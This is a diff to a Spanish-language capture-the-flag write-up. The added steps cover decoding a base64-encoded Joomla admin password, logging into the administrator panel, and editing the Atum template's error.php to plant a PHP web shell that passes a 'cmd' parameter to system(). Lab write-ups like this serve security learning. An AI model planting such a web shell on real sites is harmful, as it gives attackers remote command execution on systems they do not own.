@@ -26,6 +26,7 @@ Ya en este punto, iremos a verificar la web, vemos el típico login de Joomla, c
 
 <img width="1227" height="627" alt="candy6" src="https://github.com/user-attachments/assets/42e2742e-a8f0-4383-a015-cfb0bdd30e13" />
 
+
 Por terminal daremos el siguiente comando, que nos permitirá decodificar la password de admin.
 
 ```bash
@@ -33,8 +34,22 @@ echo "c2FubHVpczEyMzQ1" | base64 -d;echo
 ```
 <img width="560" height="277" alt="candy7" src="https://github.com/user-attachments/assets/a8f55653-98a2-43a5-bb38-e48918bd9de6" />
 
-Una vez ya tenemos la password de admin, nos loguearemos en el panel de Joomla, pero esta vez en el directorio /administrator, para acceder de una al dashboard de administrador.
+Una vez ya tenemos la password de admin, nos loguearemos en el panel de Joomla, pero esta vez en el directorio /administrator para acceder de una vez al dashboard de administrador, luego nos dirigiremos a System > Administrator Templates > Atum, para intentar modificar algun archivo del CMS y poder inyectarle código malicioso.
 
+<img width="1210" height="619" alt="candy8" src="https://github.com/user-attachments/assets/33928044-a4dc-4e14-b158-cc96199f9abe" />
+
+<img width="1210" height="619" alt="candy9" src="https://github.com/user-attachments/assets/dc0dc793-bc8e-48a2-a460-e86b5af54e16" />
+
+Encontramos un archivo llamado error.php, del cual nos aprovecharemos para invocar la función "cmd" y lograr ejecutar comandos a nivel de sistema, esto colandole lo siguiente:
+
+```bash
+if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+```
+
+<img width="1210" height="619" alt="candy10" src="https://github.com/user-attachments/assets/0483b2af-d85a-4988-ab99-66e5789a8bfc" />
 
 
 ## 💣 EXPLOTACIÓN
